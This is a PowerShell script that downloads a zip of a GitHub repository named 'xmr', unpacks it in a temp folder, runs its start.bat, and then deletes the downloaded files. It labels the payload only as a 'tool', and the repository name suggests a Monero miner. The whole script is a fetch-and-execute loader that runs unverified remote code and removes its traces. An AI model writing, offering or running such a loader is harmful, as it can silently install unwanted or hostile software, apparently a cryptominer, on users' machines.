$ErrorActionPreference = "Stop"

$repo = "https://github.com/JuStAiMrAnE/xmr/archive/refs/heads/main.zip"
$temp = Join-Path $env:TEMP "test-test_$([guid]::NewGuid())"
$zip = Join-Path $env:TEMP "test-test_$([guid]::NewGuid()).zip"

try {
    Write-Host "Downloading tool..." -ForegroundColor Cyan

    New-Item -ItemType Directory -Path $temp -Force | Out-Null
    Invoke-WebRequest -Uri $repo -OutFile $zip

    Write-Host "Extracting..." -ForegroundColor Cyan
    Expand-Archive -Path $zip -DestinationPath $temp -Force

    $folder = Get-ChildItem $temp -Directory | Select-Object -First 1
    $startBat = Join-Path $folder.FullName "start.bat"

    if (-not (Test-Path $startBat)) {
        throw "start.bat was not found in the repository."
    }

    Write-Host "Starting tool..." -ForegroundColor Green

    Start-Process "cmd.exe" -ArgumentList "/c `"$startBat`"" -WorkingDirectory $folder.FullName -Wait

}
catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
}
finally {
    Write-Host "Cleaning temporary files..." -ForegroundColor Yellow

    Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $zip -Force -ErrorAction SilentlyContinue

    Write-Host "Done." -ForegroundColor Green
}